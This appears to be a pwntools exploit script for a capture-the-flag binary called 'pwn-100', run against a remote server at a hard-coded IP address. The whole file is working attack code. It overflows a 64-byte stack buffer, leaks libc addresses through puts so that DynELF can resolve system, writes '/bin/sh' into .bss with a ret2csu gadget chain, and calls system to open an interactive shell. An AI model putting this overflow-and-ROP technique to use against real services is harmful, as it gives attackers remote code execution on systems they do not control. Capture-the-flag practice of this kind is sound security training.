#!/usr/bin/env python3
from pwn import *
elf = ELF("./pwn-100")
# context.update(binary=elf, log_level="DEBUG")
# p = elf.process()
# gdb.attach(p, '''
# 	b *0x00000000004006A7
# ''')

p = remote('61.147.171.105', '62748')

read_plt = elf.symbols['read']
read_got = elf.got['read']
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']

main_addr  =   0x4006b8
start_addr =   0x400550
pop_rdi    =   0x400763
pop6addr   =   0x40075a   # csu-1
call_addr  =   0x400740   # csu-2
wr_address =   0x601500   # write "/bin/sh\x00"

def leak(address):
	count = 0
	data = b""
	payload = b"A" * 64 + b"B" * 8
	payload += p64(pop_rdi) + p64(address)
	payload += p64(puts_plt)
	payload += p64(start_addr)
	payload = payload.ljust(200, b"B")
	p.send(payload)
	print(p.recvuntil(b"bye~\n"))
	up = b""
	while True:
		c = p.recv(numb=1, timeout=0.5)
		count += 1
		if up == b'\n' and c == b"":
			data = data[:-1]
			data += b"\x00"
			break
		else:
			data += c
		up = c
	data = data[:4]
	log.info("%#x => %s" % (address, (data or b'')))
	return data

dynelf = DynELF(leak, elf=ELF('./pwn-100'))
system_addr = dynelf.lookup('__libc_system', 'libc')
log.info("system LIBC address: " + hex(system_addr))
print("-----------write /bin/sh to bss--------------")

payload1 = b""
payload1 += b"A" * 64 + b"B" * 8
payload1 += p64(pop6addr) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(wr_address) + p64(0)
payload1 += p64(call_addr)
payload1 += b"\x00" * 56
payload1 += p64(start_addr)
payload1 = payload1.ljust(200, b"B")
p.send(payload1)
print(p.recvuntil(b"bye~\n"))
p.send(b"/bin/sh\x00")

print("-----------get shell--------------")
payload2 = b"A" * 64 + b"B" * 8
payload2 += p64(pop_rdi) + p64(wr_address)
payload2 += p64(system_addr)
payload2 += p64(start_addr)
payload2 = payload2.ljust(200, b"B")
p.send(payload2)

p.interactive()
